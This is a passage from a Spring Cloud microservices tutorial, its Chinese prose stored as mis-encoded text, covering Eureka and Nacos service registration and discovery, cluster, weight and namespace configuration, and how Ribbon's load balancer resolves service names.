http://127.0.0.1:10086/eureka\n```\n\n**æ­¥éª¤äº”ï¼šå¯åŠ¨æœåŠ¡**\n\nå¯åŠ¨å¾®æœåŠ¡ï¼Œç„¶ååœ¨æµè§ˆå™¨è®¿é—®ï¼š`http://127.0.0.1:10086`ï¼Œçœ‹åˆ°Webé¡µé¢è¡¨ç¤ºæˆåŠŸäº†\n\n### â¸æœåŠ¡æ³¨å†Œ\n\nä¸‹é¢ï¼Œæˆ‘ä»¬å°†user-serviceæ³¨å†Œåˆ°eureka-serverä¸­å»ã€‚\n\n**æ­¥éª¤ä¸€ï¼šå¼•å…¥ä¾èµ–**\n\nåœ¨user-serviceçš„pomæ–‡ä»¶ä¸­ï¼Œå¼•å…¥`eureka-client`ä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤äºŒï¼šé…ç½®æ–‡ä»¶**\n\nåœ¨user-serviceä¸­ï¼Œä¿®æ”¹application.ymlæ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡åç§°ã€eurekaåœ°å€ï¼š\n\n```yaml\nspring:\n  application:\n    name: userservice\neureka:\n  client:\n    service-url:\n      defaultZone: http://127.0.0.1:10086/eureka\n```\n\n**æ­¥éª¤ä¸‰ï¼šå¯åŠ¨å¤šä¸ªuser-serviceå®ä¾‹**\n\nä¸ºäº†æ¼”ç¤ºä¸€ä¸ªæœåŠ¡æœ‰å¤šä¸ªå®ä¾‹çš„åœºæ™¯ï¼Œå¯ä»¥é€šè¿‡SpringBootçš„å¯åŠ¨é…ç½®ï¼Œå†å¯åŠ¨ä¸€ä¸ªuser-serviceã€‚\n\n| 1.å¤åˆ¶åŸæ¥çš„user-serviceå¯åŠ¨é…ç½®ï¼š                   | 2.åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå¡«å†™ä¿¡æ¯ï¼š                                 |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/202209211240292.png) | <img src=\"https://img.jwt1399.top/img/202209211241706.png\" style=\"zoom:50%;\" /> |\n| **3.å‡ºç°ä¸¤ä¸ªuser-serviceå®ä¾‹**                       | **4.å¯åŠ¨ä¸¤ä¸ªuser-serviceå®ä¾‹**                               |\n| ![](https://img.jwt1399.top/img/202209211241315.png) | ![](https://img.jwt1399.top/img/202209211241522.png)         |\n\næŸ¥çœ‹eureka-serverç®¡ç†é¡µé¢ï¼š\n\n![](https://img.jwt1399.top/img/202209211241215.png)\n\n### â¹æœåŠ¡å‘ç°\n\nä¸‹é¢ï¼Œæˆ‘ä»¬å°†order-serviceçš„é€»è¾‘ä¿®æ”¹ï¼šå®ç°å‘eureka-serveræ‹‰å–user-serviceçš„ä¿¡æ¯ï¼Œå³æœåŠ¡å‘ç°ã€‚\n\n**æ­¥éª¤ä¸€ï¼šå¼•å…¥ä¾èµ–**\n\næœåŠ¡å‘ç°ã€æœåŠ¡æ³¨å†Œç»Ÿä¸€éƒ½å°è£…åœ¨eureka-clientä¾èµ–ï¼Œå› æ­¤è¿™ä¸€æ­¥ä¸æœåŠ¡æ³¨å†Œæ—¶ä¸€è‡´ã€‚\n\nåœ¨order-serviceçš„pomæ–‡ä»¶ä¸­ï¼Œå¼•å…¥eureka-clientä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤äºŒï¼šé…ç½®æ–‡ä»¶**\n\næœåŠ¡å‘ç°ä¹Ÿéœ€è¦çŸ¥é“eurekaåœ°å€ï¼Œåœ¨order-serviceä¸­ï¼Œä¿®æ”¹application.ymlæ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡åç§°ã€eurekaåœ°å€ï¼š\n\n```yaml\nspring:\n  application:\n    name: orderservice\neureka:\n  client:\n    service-url:\n      defaultZone: http://127.0.0.1:10086/eureka\n```\n\n**æ­¥éª¤ä¸‰ï¼šæœåŠ¡æ‹‰å–å’Œè´Ÿè½½å‡è¡¡**\n\næœ€åï¼Œæˆ‘ä»¬è¦å»eureka-serverä¸­æ‹‰å–user-serviceæœåŠ¡çš„å®ä¾‹åˆ—è¡¨ï¼Œå¹¶ä¸”å®ç°è´Ÿè½½å‡è¡¡ã€‚\n\nåœ¨order-serviceçš„OrderApplicationä¸­ï¼Œç»™RestTemplateè¿™ä¸ªBeanæ·»åŠ ä¸€ä¸ª@LoadBalancedæ³¨è§£ï¼š\n\n```java\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n\n    @Bean\n    @LoadBalanced //æ·»åŠ æ³¨è§£\n    public RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n```\n\nä¿®æ”¹order-serviceæœåŠ¡ä¸­çš„OrderServiceç±»ä¸­çš„queryOrderByIdæ–¹æ³•ã€‚ä¿®æ”¹è®¿é—®çš„urlè·¯å¾„ï¼Œç”¨æœåŠ¡åä»£æ›¿ipã€ç«¯å£ï¼š\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private RestTemplate restTemplate \n\n    public Order queryOrderById(Long orderId) {\n        // 1.æŸ¥è¯¢è®¢å•\n        Order order = orderMapper.findById(orderId);\n        // 2.è¿œç¨‹æŸ¥è¯¢user\n        // 2.1 urlåœ°å€\n\t\t\t\t//String url = \"http://localhost:8081/user/\" + order.getUserId();\n        String url = \"http://userservice/user/\" + order.getUserId();\n        // 2.2 å‘èµ·è°ƒç”¨\n        User user = restTemplate.getForObject(url, User.class);\n        // 3.å­˜å…¥order\n        order.setUser(user);\n        // 4.è¿”å›\n        return order;\n    }\n}\n```\n\nspringä¼šè‡ªåŠ¨å¸®åŠ©æˆ‘ä»¬ä»eureka-serverç«¯ï¼Œæ ¹æ®userserviceè¿™ä¸ªæœåŠ¡åç§°ï¼Œè·å–å®ä¾‹åˆ—è¡¨ï¼Œè€Œåå®Œæˆè´Ÿè½½å‡è¡¡ã€‚\n\n### âºæ€»ç»“\n\n- 1.æ­å»ºEurekaServer\n\n  - å¼•å…¥eureka-serverä¾èµ–\n\n  - æ·»åŠ @EnableEurekaServeræ³¨è§£\n  - åœ¨application.ymlä¸­é…ç½®eurekaåœ°å€\n\n- 2.æœåŠ¡æ³¨å†Œ\n  - å¼•å…¥eureka-clientä¾èµ–\n  - åœ¨application.ymlä¸­é…ç½®eurekaåœ°å€\n\n- 3.æœåŠ¡å‘ç°\n  - å¼•å…¥eureka-clientä¾èµ–\n  - åœ¨application.ymlä¸­é…ç½®eurekaåœ°å€\n  - ç»™RestTemplateæ·»åŠ @LoadBalancedæ³¨è§£\n  - ç”¨æœåŠ¡æä¾›è€…çš„æœåŠ¡åç§°è¿œç¨‹è°ƒç”¨\n\n##  â‘¡Nacos\n\n> [Nacos](https://nacos.io/)æ˜¯é˜¿é‡Œå·´å·´çš„äº§å“ï¼Œæ˜¯ SpringCloudAlibaba ä¸­çš„ä¸€ä¸ªç»„ä»¶ã€‚ç›¸æ¯” Eureka åŠŸèƒ½æ›´åŠ ä¸°å¯Œï¼Œåœ¨å›½å†…å—æ¬¢è¿ç¨‹åº¦è¾ƒé«˜ã€‚\n\n### â¶å®‰è£…\n\nä¸‹è½½åœ°å€ï¼šhttps://github.com/alibaba/nacos\n\nä¸‹è½½åè§£å‹å³å¯ï¼Œç›®å½•è¯´æ˜ï¼š\n\n```\n- log           nacosç”Ÿæˆæ—¥å¿—è¯´æ˜\n- bin           nacosæœåŠ¡ç›¸å…³è„šæœ¬ç›®å½•ï¼Œ\n- conf          nacosçš„é…ç½®æ–‡ä»¶ç›®å½•\n- target        nacosçš„å¯åŠ¨ä¾èµ–ç›®å½•\n- data          nacosè‡ªå¸¦apache-derbyæ•°æ®åº“ï¼Œdataå­˜æ”¾æ•°æ®å†…å®¹\n```\n\n```bash\n# å¯åŠ¨å‘½ä»¤ å•ä½“å¯åŠ¨\nsh startup.sh -m standalone\n\n# å…³é—­å‘½ä»¤\nsh shutdown.sh\n```\n\nåœ¨æµè§ˆå™¨è¾“å…¥åœ°å€å³å¯è®¿é—®ï¼š`http://127.0.0.1:8848/nacos`ï¼Œé»˜è®¤çš„è´¦å·å’Œå¯†ç éƒ½æ˜¯nacos\n\nå¦‚æœä½ æ‰“ä¸å¼€è¿™ä¸ªç½‘é¡µ ï¼å¤šåŠæ˜¯ç‰ˆæœ¬é—®é¢˜ã€‚\n\n### â·æœåŠ¡æ³¨å†Œ/å‘ç°\n\n**æ­¥éª¤ä¸€ï¼šå¼•å…¥ä¾èµ–**\n\nåœ¨cloud-demoçˆ¶å·¥ç¨‹çš„pomæ–‡ä»¶ä¸­çš„`<dependencyManagement>`ä¸­å¼•å…¥SpringCloudAlibabaçš„ä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-alibaba-dependencies</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <type>pom</type>\n    <scope>import</scope>\n</dependency>\n```\n\nç„¶ååœ¨user-serviceå’Œorder-serviceä¸­çš„pomæ–‡ä»¶ä¸­å¼•å…¥nacos-discoveryä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n</dependency>\n```\n\n> **æ³¨æ„**ï¼šä¸è¦å¿˜äº†æ³¨é‡Šæ‰eurekaçš„ä¾èµ–ã€‚\n\n**æ­¥éª¤äºŒï¼šé…ç½®nacosåœ°å€**\n\nåœ¨user-serviceå’Œorder-serviceçš„application.ymlä¸­æ·»åŠ nacosåœ°å€ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n```\n\n> **æ³¨æ„**ï¼šä¸è¦å¿˜äº†æ³¨é‡Šæ‰eurekaçš„åœ°å€\n\n**æ­¥éª¤ä¸‰ï¼šé‡å¯**\n\né‡å¯å¾®æœåŠ¡åï¼Œç™»å½•nacosç®¡ç†é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å¾®æœåŠ¡ä¿¡æ¯\n\n![](https://img.jwt1399.top/img/202209211820247.png)\n\n### â¸é›†ç¾¤é…ç½®\n\n#### â“µåˆ†çº§å­˜å‚¨æ¨¡å‹\n\nä¸€ä¸ª**æœåŠ¡**å¯ä»¥æœ‰å¤šä¸ª**å®ä¾‹**ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„user-serviceï¼Œå‡å¦‚è¿™äº›å®ä¾‹åˆ†å¸ƒäºå…¨å›½å„åœ°çš„ä¸åŒæœºæˆ¿\n\n| å®ä¾‹           | æœºæˆ¿ |\n| -------------- | ---- |\n| 127.0.0.1:8081 | æ­å· |\n| 127.0.0.1:8082 | æ­å· |\n| 127.0.0.1:8083 | ä¸Šæµ· |\n\nNacoså°±å°†åŒä¸€æœºæˆ¿å†…çš„å®ä¾‹åˆ’åˆ†ä¸ºä¸€ä¸ª**é›†ç¾¤**ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œuser-serviceæ˜¯æœåŠ¡ï¼Œä¸€ä¸ªæœåŠ¡å¯ä»¥åŒ…å«å¤šä¸ªé›†ç¾¤ï¼Œå¦‚æ­å·ã€ä¸Šæµ·ã€åŒ—äº¬ï¼Œæ¯ä¸ªé›†ç¾¤ä¸‹å¯ä»¥æœ‰å¤šä¸ªå®ä¾‹ï¼Œå½¢æˆåˆ†çº§æ¨¡å‹ï¼Œå¦‚å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202209211844749.png)\n\nâ‘ ä¸€çº§æ˜¯æœåŠ¡ï¼Œä¾‹å¦‚user-serviceï¼›â‘¡äºŒçº§æ˜¯é›†ç¾¤ï¼Œä¾‹å¦‚æ­å·æˆ–ä¸Šæµ·ï¼›â‘¢ä¸‰çº§æ˜¯å®ä¾‹ï¼Œä¾‹å¦‚æ­å·æœºæˆ¿çš„æŸå°éƒ¨ç½²\n\nå¾®æœåŠ¡äº’ç›¸è®¿é—®æ—¶ï¼Œåº”è¯¥å°½å¯èƒ½è®¿é—®åŒé›†ç¾¤å®ä¾‹ï¼Œå› ä¸ºæœ¬åœ°è®¿é—®é€Ÿåº¦æ›´å¿«ã€‚å½“æœ¬é›†ç¾¤å†…å®ä¾‹ä¸å¯ç”¨æ—¶ï¼Œæ‰è®¿é—®å…¶å®ƒé›†ç¾¤ã€‚ä¾‹å¦‚ï¼šæ­å·æœºæˆ¿å†…çš„order-serviceåº”è¯¥ä¼˜å…ˆè®¿é—®åŒæœºæˆ¿çš„user-serviceã€‚\n\n![](https://img.jwt1399.top/img/202209211845713.png)\n\n#### â“¶ç»™user-serviceé…ç½®é›†ç¾¤\n\nä¿®æ”¹`user-service`çš„application.ymlæ–‡ä»¶ï¼Œæ·»åŠ é›†ç¾¤é…ç½®ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ # é›†ç¾¤åç§°\n```\n\né‡å¯ä¸¤ä¸ªuser-serviceå®ä¾‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨nacosæ§åˆ¶å°çœ‹åˆ°ä¸‹é¢ç»“æœï¼š\n\n![](../images/SpringCloud-å®ç”¨ç¯‡/image-20220921185203122.png)\n\næˆ‘ä»¬å†æ¬¡å¤åˆ¶ä¸€ä¸ªuser-serviceå¯åŠ¨é…ç½®UserApplication3ï¼Œå¤åˆ¶æ–¹å¼å‚è€ƒã€ä¸Šæ–¹æ­å»ºeureka-serveræ­¥éª¤ä¸‰ã€‘\n\næ·»åŠ VMå±æ€§ï¼š\n\n```sh\n-Dserver.port=8083 -Dspring.cloud.nacos.discovery.cluster-name=SH\n```\n\nå¯åŠ¨UserApplication3åå†æ¬¡æŸ¥çœ‹nacosæ§åˆ¶å°ï¼š\n\n![](https://img.jwt1399.top/img/202209211858088.png)\n\n#### â“·åŒé›†ç¾¤ä¼˜å…ˆçš„è´Ÿè½½å‡è¡¡\n\nè´Ÿè½½å‡è¡¡é»˜è®¤è§„åˆ™`ZoneAvoidanceRule`å¹¶ä¸èƒ½å®ç°æ ¹æ®åŒé›†ç¾¤ä¼˜å…ˆæ¥å®ç°è´Ÿè½½å‡è¡¡ã€‚å› æ­¤Nacosä¸­æä¾›äº†ä¸€ä¸ª`NacosRule`çš„å®ç°ï¼Œå¯ä»¥ä¼˜å…ˆä»åŒé›†ç¾¤ä¸­æŒ‘é€‰å®ä¾‹ã€‚\n\n**æ­¥éª¤ä¸€ï¼šç»™order-serviceé…ç½®é›†ç¾¤ä¿¡æ¯**\n\nä¿®æ”¹`order-service`çš„application.ymlæ–‡ä»¶ï¼Œæ·»åŠ é›†ç¾¤é…ç½®ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ # é›†ç¾¤åç§°\n```\n\n**æ­¥éª¤äºŒï¼šä¿®æ”¹è´Ÿè½½å‡è¡¡è§„åˆ™**\n\nä¿®æ”¹`order-service`çš„application.ymlæ–‡ä»¶ï¼Œä¿®æ”¹è´Ÿè½½å‡è¡¡è§„åˆ™ï¼š\n\n```yaml\nuserservice:\n  ribbon:\n    NFLoadBalancerRuleClassName: com.alibaba.cloud.nacos.ribbon.NacosRule # è´Ÿè½½å‡è¡¡è§„åˆ™ \n```\n\nNacosRuleè´Ÿè½½å‡è¡¡ç­–ç•¥\n\n- â‘ ä¼˜å…ˆé€‰æ‹©åŒé›†ç¾¤æœåŠ¡å®ä¾‹åˆ—è¡¨\n\n- â‘¡æœ¬åœ°é›†ç¾¤æ‰¾ä¸åˆ°æä¾›è€…ï¼Œæ‰å»å…¶å®ƒé›†ç¾¤å¯»æ‰¾ï¼Œå¹¶ä¸”ä¼šæŠ¥è­¦å‘Š\n\n- â‘¢ç¡®å®šäº†å¯ç”¨å®ä¾‹åˆ—è¡¨åï¼Œå†é‡‡ç”¨éšæœºè´Ÿè½½å‡è¡¡æŒ‘é€‰å®ä¾‹\n\n### â¹æƒé‡é…ç½®\n\n**å®é™…éƒ¨ç½²ä¸­ä¼šå‡ºç°è¿™æ ·çš„åœºæ™¯ï¼š**æœåŠ¡å™¨è®¾å¤‡æ€§èƒ½æœ‰å·®å¼‚ï¼Œéƒ¨åˆ†å®ä¾‹æ‰€åœ¨æœºå™¨æ€§èƒ½è¾ƒå¥½ï¼Œå¦ä¸€äº›è¾ƒå·®ï¼Œæˆ‘ä»¬å¸Œæœ›æ€§èƒ½å¥½çš„æœºå™¨æ‰¿æ‹…æ›´å¤šçš„ç”¨æˆ·è¯·æ±‚ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹NacosRuleæ˜¯åŒé›†ç¾¤å†…éšæœºæŒ‘é€‰ï¼Œä¸ä¼šè€ƒè™‘æœºå™¨çš„æ€§èƒ½é—®é¢˜ã€‚\n\nå› æ­¤ï¼ŒNacosæä¾›äº†æƒé‡é…ç½®æ¥æ§åˆ¶è®¿é—®é¢‘ç‡ï¼Œæƒé‡è¶Šå¤§åˆ™è®¿é—®é¢‘ç‡è¶Šé«˜ã€‚åœ¨nacosæ§åˆ¶å°ï¼Œæ‰¾åˆ°user-serviceçš„å®ä¾‹åˆ—è¡¨ï¼Œç‚¹å‡»ç¼–è¾‘ï¼Œå³å¯ä¿®æ”¹æƒé‡ï¼š\n\n| ![](https://img.jwt1399.top/img/202209211916270.png) | ![](https://img.jwt1399.top/img/202209211916058.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n> **æ³¨æ„**ï¼šå¦‚æœæƒé‡ä¿®æ”¹ä¸º0ï¼Œåˆ™è¯¥å®ä¾‹æ°¸è¿œä¸ä¼šè¢«è®¿é—®ï¼Œä½¿ç”¨åœºæ™¯ï¼šè¿›è¡Œå®ä¾‹çš„å¹³æ»‘æ›´æ–°\n\n### âºç¯å¢ƒéš”ç¦»\n\nNacosæä¾›äº†namespaceæ¥å®ç°ç¯å¢ƒéš”ç¦»åŠŸèƒ½ã€‚\n\n- nacosä¸­å¯ä»¥æœ‰å¤šä¸ªnamespace\n- namespaceä¸‹å¯ä»¥æœ‰groupã€serviceç­‰\n- ä¸åŒnamespaceä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œä¾‹å¦‚ä¸åŒnamespaceçš„æœåŠ¡äº’ç›¸ä¸å¯è§\n\n**æ­¥éª¤ä¸€ï¼šåˆ›å»ºnamespace**\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰serviceã€groupã€dataéƒ½åœ¨åŒä¸€ä¸ªnamespaceï¼Œåä¸ºpublic\n\n![](https://img.jwt1399.top/img/202209211923602.png)\n\n| æ·»åŠ ä¸€ä¸ªnamespace                                    | è®¾ç½®ä¿¡æ¯                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209211922322.png) | ![](https://img.jwt1399.top/img/202209211922404.png) |\n\nå°±èƒ½åœ¨é¡µé¢çœ‹åˆ°ä¸€ä¸ªæ–°çš„namespaceï¼š\n\n![](https://img.jwt1399.top/img/202209211923581.png)\n\n**æ­¥éª¤äºŒï¼šç»™å¾®æœåŠ¡é…ç½®namespace**\n\nç»™å¾®æœåŠ¡é…ç½®namespaceåªèƒ½é€šè¿‡ä¿®æ”¹é…ç½®æ¥å®ç°ã€‚ä¾‹å¦‚ï¼Œä¿®æ”¹order-serviceçš„application.ymlæ–‡ä»¶ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ\n        namespace: 492a7d5d-237b-46a1-a99a-fa8e98e4b0f9 # å‘½åç©ºé—´ï¼Œå¡«ID\n```\n\né‡å¯order-serviceåï¼Œè®¿é—®æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢çš„ç»“æœï¼š\n\n| ![](https://img.jwt1399.top/img/202209211924994.png) | ![](https://img.jwt1399.top/img/202209211924277.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\næ­¤æ—¶è®¿é—®order-serviceï¼Œå› ä¸ºnamespaceä¸åŒï¼Œä¼šå¯¼è‡´æ‰¾ä¸åˆ°userserviceï¼Œæ§åˆ¶å°ä¼šæŠ¥é”™ï¼š\n\n![](https://img.jwt1399.top/img/202209211925591.png)\n\n## â‘¢Nacosä¸EurekaåŒºåˆ«\n\nNacosçš„æœåŠ¡å®ä¾‹åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š\n\n- ä¸´æ—¶å®ä¾‹ï¼š    å¦‚æœå®ä¾‹å®•æœºè¶…è¿‡ä¸€å®šæ—¶é—´ï¼Œä¼šä»æœåŠ¡åˆ—è¡¨å‰”é™¤ï¼Œé»˜è®¤çš„å®ä¾‹ç±»å‹ã€‚\n\n- éä¸´æ—¶å®ä¾‹ï¼šå¦‚æœå®ä¾‹å®•æœºï¼Œä¸ä¼šä»æœåŠ¡åˆ—è¡¨å‰”é™¤ï¼Œä¹Ÿå¯ä»¥å«æ°¸ä¹…å®ä¾‹ã€‚\n\né…ç½®ä¸€ä¸ªæœåŠ¡å®ä¾‹ä¸ºæ°¸ä¹…å®ä¾‹ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      discovery:\n        ephemeral: false # è®¾ç½®ä¸ºéä¸´æ—¶å®ä¾‹\n```\n\nNacoså’ŒEurekaæ•´ä½“ç»“æ„ç±»ä¼¼ï¼ŒæœåŠ¡æ³¨å†Œã€æœåŠ¡æ‹‰å–ã€å¿ƒè·³ç­‰å¾…ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨ä¸€äº›å·®å¼‚ï¼š\n\n![](https://img.jwt1399.top/img/202209211928061.png)\n\n| å…±åŒç‚¹                                                       | ä¸åŒç‚¹                                                       |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| â‘ éƒ½æ”¯æŒæœåŠ¡æ³¨å†Œå’ŒæœåŠ¡æ‹‰å–<br>â‘¡éƒ½æ”¯æŒæœåŠ¡æä¾›è€…å¿ƒè·³æ–¹å¼åšå¥åº·æ£€æµ‹ | â‘ Nacosæ”¯æŒæœåŠ¡ç«¯ä¸»åŠ¨æ£€æµ‹æä¾›è€…çŠ¶æ€ï¼Œä¸´æ—¶å®ä¾‹é‡‡ç”¨å¿ƒè·³æ¨¡å¼ï¼Œéä¸´æ—¶å®ä¾‹é‡‡ç”¨ä¸»åŠ¨æ£€æµ‹æ¨¡å¼ <br/>â‘¡ä¸´æ—¶å®ä¾‹å¿ƒè·³ä¸æ­£å¸¸ä¼šè¢«å‰”é™¤ï¼Œéä¸´æ—¶å®ä¾‹åˆ™ä¸ä¼šè¢«å‰”é™¤<br/>â‘¢Nacosæ”¯æŒæœåŠ¡åˆ—è¡¨å˜æ›´çš„æ¶ˆæ¯æ¨é€æ¨¡å¼ï¼ŒæœåŠ¡åˆ—è¡¨æ›´æ–°æ›´åŠæ—¶<br/>â‘£Nacosé›†ç¾¤é»˜è®¤é‡‡ç”¨APæ–¹å¼ï¼Œå½“é›†ç¾¤ä¸­å­˜åœ¨éä¸´æ—¶å®ä¾‹æ—¶ï¼Œé‡‡ç”¨CPæ¨¡å¼ï¼›Eurekaé‡‡ç”¨APæ–¹å¼ |\n\n# 4.è´Ÿè½½å‡è¡¡-Ribbon\n\n## â‘ è´Ÿè½½å‡è¡¡åŸç†\n\nSpringCloudåº•å±‚åˆ©ç”¨Ribbonæ¥å®ç°è´Ÿè½½å‡è¡¡åŠŸèƒ½\n\n![](https://img.jwt1399.top/img/202209211319306.png)\n\næˆ‘ä»¬å‘å‡ºçš„è¯·æ±‚æ˜æ˜æ˜¯`http://userservice/user/1`ï¼Œæ€ä¹ˆå˜æˆäº†`http://localhost:8081/user/1`çš„å‘¢ï¼Ÿ\n\n> æ˜¾ç„¶æœ‰äººå¸®æˆ‘ä»¬æ ¹æ®serviceåç§°ï¼Œè·å–åˆ°äº†æœåŠ¡å®ä¾‹çš„ipå’Œç«¯å£ã€‚å®ƒå°±æ˜¯`LoadBalancerInterceptor`ï¼Œè¿™ä¸ªç±»ä¼šåœ¨å¯¹RestTemplateçš„è¯·æ±‚è¿›è¡Œæ‹¦æˆªï¼Œç„¶åä»Eurekaæ ¹æ®æœåŠ¡idè·å–æœåŠ¡åˆ—è¡¨ï¼Œéšååˆ©ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•å¾—åˆ°çœŸå®çš„æœåŠ¡åœ°å€ä¿¡æ¯ï¼Œæ›¿æ¢æœåŠ¡idã€‚æˆ‘ä»¬è¿›è¡Œæºç è·Ÿè¸ªï¼š\n\n### â¶LoadBalancerIntercepor\n\n![](https://img.jwt1399.top/img/202209211333296.png)\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„`intercept`æ–¹æ³•ï¼Œæ‹¦æˆªäº†ç”¨æˆ·çš„HttpRequestè¯·æ±‚ï¼Œç„¶ååšäº†å‡ ä»¶äº‹ï¼š\n\n- `request.getURI()`ï¼šè·å–è¯·æ±‚uriï¼Œæœ¬ä¾‹ä¸­å°±æ˜¯ `http://user-service/user/8`\n- `originalUri.getHost()`ï¼šè·å–uriè·¯å¾„çš„ä¸»æœºåï¼Œå…¶å®å°±æ˜¯æœåŠ¡idï¼Œ`user-service`\n- `this.loadBalancer.execute()`ï¼šå¤„ç†æœåŠ¡idï¼Œå’Œç”¨æˆ·è¯·æ±‚ã€‚\n\nè¿™é‡Œçš„`this.loadBalancer`æ˜¯`LoadBalancerClient`ç±»å‹ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿå…¥executeæ–¹æ³•ï¼š\n\n### â·LoadBalancerClient\n\n![](https://img.jwt1399.top/img/202209211333636.png)\n\n- `getLoadBalancer(serviceId)`ï¼šæ ¹æ®æœåŠ¡idè·å–ILoadBalancerï¼Œè€ŒILoadBalancerä¼šæ‹¿ç€æœåŠ¡idå»eurekaä¸­è·å–æœåŠ¡åˆ—è¡¨å¹¶ä¿å­˜èµ·æ¥ã€‚\n- `getServer(loadBalancer)`ï¼šåˆ©ç”¨å†…ç½®çš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œä»æœåŠ¡åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªã€‚æœ¬ä¾‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è·å–äº†8082ç«¯å£çš„æœåŠ¡\n\næ”¾è¡Œåï¼Œå†æ¬¡è®¿é—®å¹¶è·Ÿè¸ªï¼Œå‘ç°è·å–çš„æ˜¯8081ï¼Œæœç„¶å®ç°äº†è´Ÿè½½å‡è¡¡ã€‚\n\n ![](https://img.jwt1399.top/img/202209211333458.png)\n\n### â¸è´Ÿè½½å‡è¡¡ç­–ç•¥IRule\n\nåœ¨åˆšæ‰çš„ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è·å–æœåŠ¡ä½¿é€šè¿‡ä¸€ä¸ª`getServer`æ–¹æ³•æ¥åšè´Ÿè½½å‡è¡¡:\n\n![](https://img.jwt1399.top/img/202209211333458.png)\n\næˆ‘ä»¬ç»§ç»­è·Ÿå…¥ï¼š\n\n![](https://img.jwt1399.top/img/202209211337777.png)\n\nç»§ç»­è·Ÿè¸ªæºç chooseServeræ–¹æ³•ï¼Œå‘ç°è¿™ä¹ˆä¸€æ®µä»£ç ï¼š\n\n| ![](https://img.jwt1399.top/img/202209211337640.png) | ![](https://img.jwt1399.top/img/202209211337661.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\nè¿™é‡Œçš„ruleé»˜è®¤å€¼æ˜¯ä¸€ä¸ª`RoundRobinRule`ï¼Œçœ‹ç±»çš„ä»‹ç»ï¼š\n\n ![](https://img.jwt1399.top/img/202209211339083.png)\n\nè¿™ä¸å°±æ˜¯è½®è¯¢çš„æ„æ€å˜›ã€‚åˆ°è¿™é‡Œï¼Œæ•´ä¸ªè´Ÿè½½å‡è¡¡çš„æµç¨‹æˆ‘ä»¬å°±æ¸…æ¥šäº†ã€‚\n\n### â¹æ€»ç»“\n\nRibbonçš„åº•å±‚é‡‡ç”¨äº†ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œæ‹¦æˆªäº†RestTemplateå‘å‡ºçš„è¯·æ±‚ï¼Œå¯¹åœ°å€åšäº†ä¿®æ”¹ã€‚ç”¨ä¸€å¹…å›¾æ¥æ€»ç»“ä¸€ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202209211340322.png)\n\nåŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š\n\n- 1.æ‹¦æˆªæˆ‘ä»¬çš„**RestTemplate**è¯·æ±‚`http://userservice/user/1`\n- 2.**RibbonLoadBalancerClient**ä¼šä»è¯·æ±‚urlä¸­è·å–æœåŠ¡åç§°ï¼Œä¹Ÿå°±æ˜¯userservice\n- 3.**DynamicServerListLoadBalancer**æ ¹æ®userserviceåˆ°eurekaæ‹‰å–æœåŠ¡åˆ—è¡¨\n- 4.**eureka-server**è¿”å›åˆ—è¡¨ï¼Œlocalhost:8081ã€localhost:8082\n- 5.**IRule**åˆ©ç”¨å†…ç½®è´Ÿè½½å‡è¡¡è§„åˆ™ï¼Œä»åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œä¾‹å¦‚localhost:8081\n- 